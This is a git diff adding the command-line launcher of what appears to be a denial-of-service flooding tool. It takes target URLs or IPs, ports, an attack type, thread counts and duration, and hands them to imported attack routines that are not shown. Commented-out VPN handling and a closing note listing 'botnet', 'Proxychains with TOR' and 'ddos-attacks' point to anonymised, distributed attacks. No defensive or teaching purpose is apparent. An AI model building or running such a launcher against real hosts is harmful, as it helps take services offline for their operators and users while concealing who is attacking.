@@ -1,0 +1,81 @@
+from pyfiglet import Figlet
+from func import *
+from techniques import *
+import sys
+
+ 
+
+print("please enter url or ip or urls or IPs ")
+x=sys.argv[1]
+
+print("enter your input ")
+input_choise=sys.argv[2]
+
+len=len(input_choise.split())
+
+
+if x == "ip":
+    if len == 1:
+        ipchecker(input_choise)
+        url=input_choise
+    else:
+        print("choose an ip or IPs options ")
+        exit()
+
+elif x == "url":
+
+    if len == 1:
+        url=urlcheker(input_choise)
+    else:
+        print("choose an url or use urls options ")
+        exit()
+
+elif x == "urls" and len == 1:
+        file(input_choise)
+        urls=strip(input_choise)
+        for line in urls:
+            status=urlcheker(line)
+            if status == True:
+              pass
+            else:
+                print("be sure you do not have space at end of file or check your website format")
+                exit()
+
+        url=domaintoip(urls)
+
+
+elif x == "ips" and len == 1:
+                file(input_choise)
+                url=strip(input_choise)
+                for line in url:
+                   res=ipchecker(line)
+                   if res == True:
+                       pass
+                   else:
+                    print("be sure you do not have space at end of file or check your ips")
+                    exit()
+
+
+else:
+    print("invalid input ")
+
+
+#vpn_path=sys.argv[3]
+#system_password=sys.argv[4]
+#vpn_username=sys.argv[5]
+#vpn_password=sys.argv[6]
+srcport=int(sys.argv[3])
+dstport=int(sys.argv[4])
+dos=sys.argv[5]
+thread_num=int(sys.argv[6])
+second=int(sys.argv[7])
+forc=int(sys.argv[8])
+count=int(sys.argv[9])
+
+#vpn(vpn_path,system_password,vpn_username,vpn_password)
+
+
+thread(url,srcport,dstport,dos,thread_num,second,forc,count)
+
+#,second,forc,count)
+"""1-botnet 2-Proxychains with TOR  3-ddos-attacks """
